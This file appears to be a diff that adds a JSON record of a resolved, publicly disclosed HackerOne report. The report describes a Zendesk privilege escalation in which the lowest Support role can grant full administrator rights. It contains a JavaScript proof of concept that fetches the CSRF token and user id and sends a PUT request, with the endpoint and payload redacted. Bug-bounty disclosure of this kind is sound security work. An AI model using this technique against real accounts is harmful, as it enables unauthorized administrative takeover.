@@ -1,0 +1,130 @@
+{
+  "id": 2188569,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTg4NTY5",
+  "url": "https://hackerone.com/reports/2188569",
+  "title": "Privilege escalation - Support-Contributor to Support and Product Admin via `/api/v2/██████` . No ADMIN PRIVILEGE required.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2023-10-01T12:00:39.937Z",
+  "submitted_at": "2023-10-01T12:00:40.172Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cybxis",
+    "url": "/cybxis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/5qp48wloo7dtjulzv4zc4gt0jpyr/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 205,
+    "url": "https://hackerone.com/zendesk",
+    "handle": "zendesk",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/205/1f7838d9b4201d122e0a7fbacc8ff3e90f57fa0c_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/205/1f7838d9b4201d122e0a7fbacc8ff3e90f57fa0c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Zendesk",
+      "twitter_handle": "",
+      "website": "https://www.zendesk.com",
+      "about": "Zendesk is a leading cloud-based customer service software solution. Over 100,000 customer accounts use Zendesk to increase customer satisfaction."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-12-18T20:05:21.306Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-11-25T03:50:48.092Z",
+  "team_member_agreed_on_going_public_at": "2023-12-18T20:05:21.141Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello team, I am reporting another privilege escalation issue where a lowest privilege member(Support-Contributor) to full Support and Product administrator.  Tested in Zendesk Enterprise(Sponsored) and Trial Account.\n\nFrom my past reports I was able to find privilege escalation issues on the endpoint `/api/███` . The difference is, to perform a privilege escalation on the said endpoint, there should be at least one Product Admin privilege on the actor's account but this report does not require any Admin privilege(just the lowest privilege alone).\n\n## Summary:\nThe [Contributor Role](https://support.zendesk.com/hc/en-us/articles/4408832171034-About-team-member-product-roles-and-access) is the lowest Support role in Zendesk. In the UI alone, as a contributor, the accessible pages and and endpoints are very limited. With this role, the members page is not even accessible or restricted. With these restrictions, escalating your own role seem to be impossible.\n\n##Improper Access Control to Privilege Escalation\nVulnerable Endpoint: `PUT /api███ HTTP/2`\n\nThe `/api████████` endpoint is used for API integration to █████. █████████ . However, the said endpoint does not validate the privilege of the user who is sending a request. With this bug, a member with even just the lowest privilege(Contributor) is able to escalate any members' privilege to `FULL ADMINISTRATOR` including its own privilege.\n\n## Browsers Verified In:\nLatest version of Chrome and Firefox\n\n##Exploit\n```javascript\n//Exploit\n//get csrf token and id\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\n    if (this.readyState == 4 && this.status == 200) {\n        var profile = JSON.parse(this.responseText);\n        var csrf = profile.user.authenticity_token;\n\t\tvar id = profile.user.id;\n        escalate(id, csrf);\n    }\n};\n\nxhttp.open(\"GET\", \"https://\" + document.domain + \"/api/v2/users/me.json\");\nxhttp.send();\n\n\n//privilege escalation function\nfunction escalate(id, csrf) {\n    var xhttp = new XMLHttpRequest();\n    xhttp.onreadystatechange = function() {\n        if (this.readyState == 4 && this.status == 200) {\n            console.log(this.responseText);\n        }\n    };\n\n    xhttp.open(\"PUT\", \"https://\" + document.domain + \"/api██████;\n    xhttp.setRequestHeader(\"X-Csrf-Token\", csrf);\n    xhttp.setRequestHeader(\"Content-Type\", \"application/json\");\n    xhttp.send(JSON.stringify(███));\n}\n```\n\n## Steps To Reproduce:\n`On owner/admin account`\n1. Go to https://<domain>.zendesk.com/admin/people/team/members/new\n2. Provide the name and email of the agent\n3. Click Next\n4. Set the Support role to CONTRIBUTOR\n5. Go to https://<domain>.zendesk.com/admin/people/team/members\n6. Click the profile on the invited user\n7. Now set the roles to Support-Contributor only and `DISABLE` any product access(just to prove that no other privilege is required).\n\n`On invited user`\n8. You will receive an email. Click it to accept the invitation\n9. Login the invited account\n10. Execute the exploit to escalate your privileges.\n\n## Demo And PoC\nOn Enterprise account\n███\nOn Trial account\n███\n\n## Impact\n\nPrivilege escalation - Support-Contributor to Support and Product Admin.",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 41,
+  "voters": [
+    "8910jq",
+    "shreyaschavhan",
+    "spaceboy20",
+    "zy9ard3",
+    "ronak_9889",
+    "shubham_srt",
+    "spell1",
+    "cybxis",
+    "neil-tsakatsa",
+    "paler",
+    "and 31 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 16067,
+    "asset_type": "URL",
+    "asset_identifier": "h1-your-domain.zendesk.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
